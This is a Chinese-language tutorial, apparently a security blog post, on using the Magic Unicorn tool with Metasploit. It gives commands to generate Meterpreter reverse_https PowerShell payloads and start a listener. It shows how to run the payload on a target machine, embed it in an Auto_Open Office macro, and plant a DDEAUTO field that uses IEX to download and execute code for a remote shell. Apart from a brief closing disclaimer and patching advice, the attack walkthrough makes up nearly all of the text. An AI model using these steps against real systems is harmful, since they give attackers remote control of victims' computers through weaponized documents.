Magic Unicorn 是 PowerShell 降级攻击的工具，可将 shellcode 直接注入内存，把所有 payload 都转换成
powershell 代码。只需运行 Magic Unicorn（确保安装了 Metasploit）将自动生成一个 powershell 命令，只需将
powershell 代码剪切并粘贴到命令行窗口或通过有效载荷利用。

## 下载及使用说明

从 git 存储库下载：https://github.com/trustedsec/unicorn.git

![1622541804_60b605ec776a32458e645.png!small?1622541805504](https://image.3001.net/images/20210601/1622541804_60b605ec776a32458e645.png!small?1622541805504)

下载完后，进入该目录运行 unicorn.py 文件可以查看所支持方法

![1622541933_60b6066df1a73756c7751.png!small?1622541935205](https://image.3001.net/images/20210601/1622541933_60b6066df1a73756c7751.png!small?1622541935205)

##  **Powershell方式利用**

利用 reverse_tcp 负载

    
    
    python unicorn.py windows/meterpreter/reverse_https <lhost> <lpost> 

运行之后会生成两个文件，powershell_attack.txt 和 unicorn.rc ，powershell_attack.txt 文本文件包含将
powershell 攻击注入内存所需的所有代码，unicorn.rc 是调用 Metasploit 的侦听器

![1622544755_60b6117386ef6cd8ac271.png!small?1622544757163](https://image.3001.net/images/20210601/1622544755_60b6117386ef6cd8ac271.png!small?1622544757163)

需要使用以下命令运行 Metasploit “unicorn.rc”文件

    
    
    msfconsole -r unicorn.rc

![1622545036_60b6128c91fd9ba14e816.png!small?1622545037594](https://image.3001.net/images/20210601/1622545036_60b6128c91fd9ba14e816.png!small?1622545037594)

将powershell_attack.txt里的内容复制到目标机CMD命令行下执行 Metasploit 会收到连接

![1622545214_60b6133eddb84f53f98e9.png!small?1622545215971](https://image.3001.net/images/20210601/1622545214_60b6133eddb84f53f98e9.png!small?1622545215971)

##  **宏攻击方式利用**

对于宏攻击，需要到文件里创建一个新宏，将其命名为 Auto_Open 并将生成的代码粘贴到其中，利用方式如下

    
    
    python unicorn.py windows/meterpreter/reverse_https <lhost> <lpost> macro

同样会生成两个文件 powershell_attack.txt 和 unicorn.rc，新建宏如下

![1622546206_60b6171ec704b170ce602.png!small?1622546207782](https://image.3001.net/images/20210601/1622546206_60b6171ec704b170ce602.png!small?1622546207782)

把 powershell_attack.txt 中的内容粘贴到新建的宏里，然后保存

![1622546394_60b617daba31f0d4c231b.png!small?1622546395599](https://image.3001.net/images/20210601/1622546394_60b617daba31f0d4c231b.png!small?1622546395599)

运行 unicorn.rc 开始监听

![1622546515_60b618531df64bf3755b6.png!small?1622546516582](https://image.3001.net/images/20210601/1622546515_60b618531df64bf3755b6.png!small?1622546516582)

运行之后会提示错误（不用管），过会将会在 Meterpreter 中成功获取会话

![1622546598_60b618a6ef89cfb6bd116.png!small?1622546599772](https://image.3001.net/images/20210601/1622546598_60b618a6ef89cfb6bd116.png!small?1622546599772)

## DDE Office COM 攻击利用方式

此利用方式将生成 DDEAUTO 放置到 Word 或 Excel 文档部件域中。COM 对象 DDEInitilize 和 DDEExecute
允许直接在 Office 中创建，从而无需宏即可获得远程代码执行。

![1622546890_60b619ca94c3f641f6edf.png!small?1622546891416](https://image.3001.net/images/20210601/1622546890_60b619ca94c3f641f6edf.png!small?1622546891416)

利用以下方式生成攻击模块

    
    
    python unicorn.py <payload> <lhost> <lport> dde

这里会生成三个文件 powershell_attack.txt 和 unicorn.rc 文件，这两个文件是侦听器组件，download.ps1 是
powershell 注入攻击

![1622547266_60b61b420637d5ee07eb1.png!small?1622547266869](https://image.3001.net/images/20210601/1622547266_60b61b420637d5ee07eb1.png!small?1622547266869)

把 powershell_attack.txt 中的内容复制

![1622547498_60b61c2a28257376a23a7.png!small?1622547498985](https://image.3001.net/images/20210601/1622547498_60b61c2a28257376a23a7.png!small?1622547498985)

选择切换域代码更换里面内容进行保存（开头DDE要换成DDEAUTO，要不然执行不了）

![1622548029_60b61e3dac3227cd6e84a.png!small?1622548030489](https://image.3001.net/images/20210601/1622548029_60b61e3dac3227cd6e84a.png!small?1622548030489)

打开 office 文档后，会通过 powershell 注入的 shell 这里需要注意的是 DDE 对字符大小有限制，我们需要使用 Invoke-Expression (IEX) 作为下载方法

![1622547690_60b61cea58370190d5ac2.png!small?1622547691234](https://image.3001.net/images/20210601/1622547690_60b61cea58370190d5ac2.png!small?1622547691234)

Magic Unicorn还有其它利用方式，如 HTA 、自定义 PS1 、Cobalt Strike Beacon
、自定义Shellcode生成方法等方式，以下两个链接无宏代码执行跟混淆域代码方式，请参考

<https://staaldraad.github.io/2017/10/23/msword-field-codes/>

<https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/>

  

## 安全建议

1、本文仅供学习研究使用

2、及时或常更新软件补丁

3、下载官方软件，对自身做好防病毒准备

